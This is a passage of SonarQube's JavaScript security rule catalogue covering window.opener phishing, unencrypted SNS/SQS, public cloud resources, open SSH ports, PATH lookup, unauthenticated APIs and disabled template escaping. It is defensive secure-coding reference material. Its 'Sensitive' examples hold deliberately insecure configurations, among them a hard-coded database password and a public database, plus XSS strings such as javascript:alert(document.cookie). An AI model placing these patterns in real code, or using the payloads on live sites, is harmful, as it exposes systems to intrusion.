  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP, Insecure Temporary File</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5148">
              javascript:S5148
            </a>
          </td>
          <td>
            <details>
              <p>A newly opened window having access back to the originating window could allow basic phishing attacks (the <code>window.opener</code> object is not
<code>null</code> and thus <code>window.opener.location</code> can be set to a malicious website by the opened page).</p>
<p>For instance, an attacker can put a link (say: "http://example.com/mylink") on a popular website that changes, when opened, the original page to
"http://example.com/fake_login". On "http://example.com/fake_login" there is a fake login page which could trick real users to enter their
credentials.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application opens untrusted external URL. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use <code>noopener</code> to prevent untrusted pages from abusing <code>window.opener</code>.</p>
<p>Note: In Chrome 88+, Firefox 79+ or Safari 12.1+ <code>target=_blank</code> on anchors implies <code>rel=noopener</code> which make the protection
enabled by default.</p>
<h2>Sensitive Code Example</h2>
<pre>
window.open("https://example.com/dangerous"); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
window.open("https://example.com/dangerous", "WindowName", "noopener");
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/Reverse_Tabnabbing">Reverse Tabnabbing</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1022">CWE-1022 - Use of Web Link to Untrusted Target with window.opener Access</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://mathiasbynens.github.io/rel-noopener/">https://mathiasbynens.github.io/rel-noopener/</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6327">
              javascript:S6327
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)
communication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages
when they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to
access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The topic contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html"><code>aws_cdk.aws_sns.Topic</code></a></p>
<pre>
import { Topic } from 'aws-cdk-lib/aws-sns';

new Topic(this, 'exampleTopic'); // Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html"><code>aws_cdk.aws_sns.CfnTopic</code></a></p>
<pre>
import { Topic, CfnTopic } from 'aws-cdk-lib/aws-sns';

new CfnTopic(this, 'exampleCfnTopic'); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html"><code>aws_cdk.aws_sns.Topic</code></a></p>
<pre>
import { Topic } from 'aws-cdk-lib/aws-sns';

const encryptionKey = new Key(this, 'exampleKey', {
    enableKeyRotation: true,
});

new Topic(this, 'exampleTopic', {
    masterKey: encryptionKey
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html"><code>aws_cdk.aws_sns.CfnTopic</code></a></p>
<pre>
import { CfnTopic } from 'aws-cdk-lib/aws-sns';

const encryptionKey = new Key(this, 'exampleKey', {
    enableKeyRotation: true,
});

cfnTopic = new CfnTopic(this, 'exampleCfnTopic', {
    kmsMasterKeyId: encryptionKey.keyId
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html">AWS Documentation</a> - Encryption at rest </li>
  <li> <a href="https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/">Encrypting messages published to
  Amazon SNS with AWS KMS</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6329">
              javascript:S6329
            </a>
          </td>
          <td>
            <details>
              <p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft
or disruption.</p>
<p>Depending on the component, inbound access from the Internet can be enabled via:</p>
<ul>
  <li> a boolean value that explicitly allows access to the public network. </li>
  <li> the assignment of a public IP address. </li>
  <li> database firewall rules that allow public IP ranges. </li>
</ul>
<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>
<p>This decision increases the likelihood of attacks on the organization, such as:</p>
<ul>
  <li> data breaches. </li>
  <li> intrusions into the infrastructure to permanently steal from it. </li>
  <li> and various malicious traffic, such as DDoS attacks. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<p>This cloud resource:</p>
<ul>
  <li> should be publicly accessible to any Internet user. </li>
  <li> requires inbound traffic from the Internet to function properly. </li>
</ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce
sites.</p>
<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud
components.</p>
<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the
absence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html">aws-cdk-lib.aws_ec2.Instance</a> and similar
constructs:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.Instance(this, "example", {
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    vpcSubnets: {subnetType: ec2.SubnetType.PUBLIC} // Sensitive
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnInstance.html">aws-cdk-lib.aws_ec2.CfnInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.CfnInstance(this, "example", {
    instanceType: "t2.micro",
    imageId: "ami-0ea0f26a6d50850c5",
    networkInterfaces: [
        {
            deviceIndex: "0",
            associatePublicIpAddress: true, // Sensitive
            deleteOnTermination: true,
            subnetId: vpc.selectSubnets({subnetType: ec2.SubnetType.PUBLIC}).subnetIds[0]
        }
    ]
})
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_dms.CfnReplicationInstance.html">aws-cdk-lib.aws_dms.CfnReplicationInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new dms.CfnReplicationInstance(
    this, "example", {
    replicationInstanceClass: "dms.t2.micro",
    allocatedStorage: 5,
    publiclyAccessible: true, // Sensitive
    replicationSubnetGroupIdentifier: subnetGroup.replicationSubnetGroupIdentifier,
    vpcSecurityGroupIds: [vpc.vpcDefaultSecurityGroup]
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html">aws-cdk-lib.aws_rds.CfnDBInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

const rdsSubnetGroupPublic = new rds.CfnDBSubnetGroup(this, "publicSubnet", {
    dbSubnetGroupDescription: "Subnets",
    dbSubnetGroupName: "publicSn",
    subnetIds: vpc.selectSubnets({
        subnetType: ec2.SubnetType.PUBLIC
    }).subnetIds
})

new rds.CfnDBInstance(this, "example", {
    engine: "postgres",
    masterUsername: "foobar",
    masterUserPassword: "12345678",
    dbInstanceClass: "db.r5.large",
    allocatedStorage: "200",
    iops: 1000,
    dbSubnetGroupName: rdsSubnetGroupPublic.ref,
    publiclyAccessible: true, // Sensitive
    vpcSecurityGroups: [sg.securityGroupId]
})
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html">aws-cdk-lib.aws_ec2.Instance</a> and similar
constructs:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.Instance(
    this,
    "example", {
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    vpcSubnets: {subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS}
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnInstance.html">aws-cdk-lib.aws_ec2.CfnInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.CfnInstance(this, "example", {
    instanceType: "t2.micro",
    imageId: "ami-0ea0f26a6d50850c5",
    networkInterfaces: [
        {
            deviceIndex: "0",
            associatePublicIpAddress: false,
            deleteOnTermination: true,
            subnetId: vpc.selectSubnets({subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS}).subnetIds[0]
        }
    ]
})
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_dms.CfnReplicationInstance.html">aws-cdk-lib.aws_dms.CfnReplicationInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new dms.CfnReplicationInstance(
    this, "example", {
    replicationInstanceClass: "dms.t2.micro",
    allocatedStorage: 5,
    publiclyAccessible: false,
    replicationSubnetGroupIdentifier: subnetGroup.replicationSubnetGroupIdentifier,
    vpcSecurityGroupIds: [vpc.vpcDefaultSecurityGroup]
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html">aws-cdk-lib.aws_rds.CfnDBInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

const rdsSubnetGroupPrivate = new rds.CfnDBSubnetGroup(this, "example",{
    dbSubnetGroupDescription: "Subnets",
    dbSubnetGroupName: "privateSn",
    subnetIds: vpc.selectSubnets({
        subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS
    }).subnetIds
})

new rds.CfnDBInstance(this, "example", {
    engine: "postgres",
    masterUsername: "foobar",
    masterUserPassword: "12345678",
    dbInstanceClass: "db.r5.large",
    allocatedStorage: "200",
    iops: 1000,
    dbSubnetGroupName: rdsSubnetGroupPrivate.ref,
    publiclyAccessible: false,
    vpcSecurityGroups: [sg.securityGroupId]
})
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html">AWS Documentation</a> - Amazon EC2 instance IP
  addressing </li>
  <li> <a href="https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html">AWS Documentation</a> - Public and
  private replication instances </li>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html">AWS Documentation</a> - VPC Peering </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6321">
              javascript:S6321
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Cloud platforms such as AWS, Azure, or GCP support virtual firewalls that can be used to restrict access to services by controlling inbound and
outbound traffic.<br> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services
traditionally listen, such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>
<h3>What is the potential impact?</h3>
<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a
vulnerability could have a high impact on the system.</p>
<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the
credentials to log in to the system.</p>
<h2>How to fix it</h2>
<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those
held by system administrators or those of <a href="https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1=h_ls">bastion-like</a>
servers.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html">aws-cdk-lib.aws_ec2.Instance</a> and other constructs
that support a <code>connections</code> attribute:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

const instance = new ec2.Instance(this, "default-own-security-group",{
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    instanceName: "test-instance"
})

instance.connections.allowFrom(
    ec2.Peer.anyIpv4(), // Noncompliant
    ec2.Port.tcp(22),
    /*description*/ "Allows SSH from all IPv4"
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html">aws-cdk-lib.aws_ec2.SecurityGroup</a></p>
<pre data-diff-id="2" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

const securityGroup = new ec2.SecurityGroup(this, "custom-security-group", {
    vpc: vpc
})

securityGroup.addIngressRule(
    ec2.Peer.anyIpv4(), // Noncompliant
    ec2.Port.tcpRange(1, 1024)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroup.html">aws-cdk-lib.aws_ec2.CfnSecurityGroup</a></p>
<pre data-diff-id="3" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.CfnSecurityGroup(
    this,
    "cfn-based-security-group", {
        groupDescription: "cfn based security group",
        groupName: "cfn-based-security-group",
        vpcId: vpc.vpcId,
        securityGroupIngress: [
            {
                ipProtocol: "6",
                cidrIp: "0.0.0.0/0", // Noncompliant
                fromPort: 22,
                toPort: 22
            }
        ]
    }
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress.html">aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress</a></p>
<pre data-diff-id="4" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.CfnSecurityGroupIngress( // Noncompliant
    this,
    "ingress-all-ip-tcp-ssh", {
        ipProtocol: "tcp",
        cidrIp: "0.0.0.0/0",
        fromPort: 22,
        toPort: 22,
        groupId: securityGroup.attrGroupId
})
</pre>
<h4>Compliant solution</h4>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html">aws-cdk-lib.aws_ec2.Instance</a> and other constructs
that support a <code>connections</code> attribute:</p>
<pre data-diff-id="1" data-diff-type="compliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

const instance = new ec2.Instance(this, "default-own-security-group",{
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    instanceName: "test-instance"
})

instance.connections.allowFrom(
    ec2.Peer.ipv4("192.0.2.0/24"),
    ec2.Port.tcp(22),
    /*description*/ "Allows SSH from a trusted range"
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html">aws-cdk-lib.aws_ec2.SecurityGroup</a></p>
<pre data-diff-id="2" data-diff-type="compliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

const securityGroup3 = new ec2.SecurityGroup(this, "custom-security-group", {
    vpc: vpc
})

securityGroup3.addIngressRule(
    ec2.Peer.anyIpv4(),
    ec2.Port.tcpRange(1024, 1048)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroup.html">aws-cdk-lib.aws_ec2.CfnSecurityGroup</a></p>
<pre data-diff-id="3" data-diff-type="compliant">
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.CfnSecurityGroup(
    this,
    "cfn-based-security-group", {
        groupDescription: "cfn based security group",
        groupName: "cfn-based-security-group",
        vpcId: vpc.vpcId,
        securityGroupIngress: [
            {
                ipProtocol: "6",
                cidrIp: "192.0.2.0/24",
                fromPort: 22,
                toPort: 22
            }
        ]
    }
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress.html">aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress</a></p>
<pre data-diff-id="4" data-diff-type="compliant">
new ec2.CfnSecurityGroupIngress(
    this,
    "ingress-all-ipv4-tcp-http", {
        ipProtocol: "6",
        cidrIp: "0.0.0.0/0",
        fromPort: 80,
        toPort: 80,
        groupId: securityGroup.attrGroupId
    }
)
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html">AWS Documentation</a> - Security groups for your VPC </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview">Azure Documentation</a> - Network security
  groups </li>
  <li> <a href="https://cloud.google.com/vpc/docs/using-firewalls">GCP Documentation</a> - Firewalls </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4036">
              javascript:S4036
            </a>
          </td>
          <td>
            <details>
              <p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>
environment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in
<code>PATH</code> is a directory under his control.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The directories in the PATH environment variable may be defined by not trusted entities. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>
<h2>Sensitive Code Example</h2>
<pre>
const cp = require('child_process');
cp.exec('file.exe'); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const cp = require('child_process');
cp.exec('/usr/bin/file.exe'); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/426">CWE-426 - Untrusted Search Path</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/427">CWE-427 - Uncontrolled Search Path Element</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6333">
              javascript:S6333
            </a>
          </td>
          <td>
            <details>
              <p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>
<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br> This means attacks
both on the functionality provided by the API and its infrastructure.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The underlying API exposes all of its contents to any anonymous Internet user. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, prefer limiting API access to a specific set of people or entities.</p>
<p>AWS provides multiple methods to do so:</p>
<ul>
  <li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li>
  <li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li>
  <li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigateway.Resource.html">aws-cdk-lib.aws_apigateway.Resource</a>:</p>
<pre>
import {aws_apigateway as apigateway} from "aws-cdk-lib"

const resource = api.root.addResource("example")
resource.addMethod(
    "GET",
    new apigateway.HttpIntegration("https://example.org"),
    {
        authorizationType: apigateway.AuthorizationType.NONE // Sensitive
    }
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html">aws-cdk-lib.aws_apigatewayv2.CfnRoute</a>:</p>
<pre>
import {aws_apigatewayv2 as apigateway} from "aws-cdk-lib"

new apigateway.CfnRoute(this, "no-auth", {
    apiId: api.ref,
    routeKey: "GET /no-auth",
    authorizationType: "NONE", // Sensitive
    target: exampleIntegration
})
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigateway.Resource.html">aws-cdk-lib.aws_apigateway.Resource</a>:</p>
<pre>
import {aws_apigateway as apigateway} from "aws-cdk-lib"

const resource = api.root.addResource("example",{
    defaultMethodOptions:{
        authorizationType: apigateway.AuthorizationType.IAM
    }
})
resource.addMethod(
    "POST",
    new apigateway.HttpIntegration("https://example.org"),
    {
        authorizationType: apigateway.AuthorizationType.IAM
    }
)
resource.addMethod(  // authorizationType is inherited from the Resource's configured defaultMethodOptions
    "GET"
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html">aws-cdk-lib.aws_apigatewayv2.CfnRoute</a>:</p>
<pre>
import {aws_apigatewayv2 as apigateway} from "aws-cdk-lib"

new apigateway.CfnRoute(this, "auth", {
    apiId: api.ref,
    routeKey: "POST /auth",
    authorizationType: "AWS_IAM",
    target: exampleIntegration
})
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html">AWS Documentation</a> -
  Controlling and managing access to a REST API in API Gateway </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5247">
              javascript:S5247
            </a>
          </td>
          <td>
            <details>
              <p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,
<code>Groovy's template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters
that make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>
<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a
href="https://twig.symfony.com/doc/3.x/filters/escape.html">the strategy applied</a> and the context, for example a "html auto-escaping" strategy
(which only transforms html characters into <a href="https://developer.mozilla.org/en-US/docs/Glossary/Entity">html entities</a>) will not be relevant
when variables are used in a <a href="https://en.wikipedia.org/wiki/HTML_attribute">html attribute</a> because '<code>:</code>' character is not
escaped and thus an attack as below is possible:</p>
<pre>
&lt;a href="{{ myLink }}"&gt;link&lt;/a&gt; // myLink = javascript:alert(document.cookie)
&lt;a href="javascript:alert(document.cookie)"&gt;link&lt;/a&gt; // JS injection (XSS attack)
</pre>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Templates are used to render web content and
    <ul>
      <li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li>
      <li> there is no local mechanism in place to sanitize or validate the inputs. </li>
    </ul>  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right
one.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/mustache">mustache.js</a> template engine:</p>
<pre>
let Mustache = require("mustache");

Mustache.escape = function(text) {return text;}; // Sensitive

let rendered = Mustache.render(template, { name: inputName });
</pre>
<p><a href="https://www.npmjs.com/package/handlebars">handlebars.js</a> template engine:</p>
<pre>
const Handlebars = require('handlebars');

let source = "&lt;p&gt;attack {{name}}&lt;/p&gt;";

let template = Handlebars.compile(source, { noEscape: true }); // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/markdown-it">markdown-it</a> markup language parser:</p>
<pre>
const markdownIt = require('markdown-it');
let md = markdownIt({
  html: true // Sensitive
});

let result = md.render('# &lt;b&gt;attack&lt;/b&gt;');
</pre>
<p><a href="https://www.npmjs.com/package/marked">marked</a> markup language parser:</p>
<pre>
const marked = require('marked');

marked.setOptions({
  renderer: new marked.Renderer(),
  sanitize: false // Sensitive
});

console.log(marked("# test &lt;b&gt;attack/b&gt;"));
</pre>
<p><a href="https://www.npmjs.com/package/kramed">kramed</a> markup language parser:</p>
<pre>
let kramed = require('kramed');

var options = {
  renderer: new kramed.Renderer({
    sanitize: false // Sensitive
  })
};
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/mustache">mustache.js</a> template engine:</p>
<pre>
let Mustache = require("mustache");

let rendered = Mustache.render(template, { name: inputName }); // Compliant autoescaping is on by default
</pre>
<p><a href="https://www.npmjs.com/package/handlebars">handlebars.js</a> template engine:</p>
<pre>
const Handlebars = require('handlebars');

let source = "&lt;p&gt;attack {{name}}&lt;/p&gt;";
let data = { "name": "&lt;b&gt;Alan&lt;/b&gt;" };

let template = Handlebars.compile(source); // Compliant by default noEscape is set to false
</pre>
<p><a href="https://www.npmjs.com/package/markdown-it">markdown-it</a> markup language parser:</p>
<pre>
let md = require('markdown-it')(); // Compliant by default html is set to false

let result = md.render('# &lt;b&gt;attack&lt;/b&gt;');
</pre>
<p><a href="https://www.npmjs.com/package/marked">marked</a> markup language parser:</p>
<pre>
const marked = require('marked');

marked.setOptions({
  renderer: new marked.Renderer()
}); // Compliant by default sanitize is set to true

console.log(marked("# test &lt;b&gt;attack/b&gt;"));
</pre>
<p><a href="https://www.npmjs.com/package/kramed">kramed</a> markup language parser:</p>
<pre>
let kramed = require('kramed');

let options = {
  renderer: new kramed.Renderer({
    sanitize: true // Compliant
  })
};

console.log(kramed('Attack [xss?](javascript:alert("xss")).', options));
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6330">
              javascript:S6330
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store
messages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message
from the file system, for example through a vulnerability in the service, they are not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The queue contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
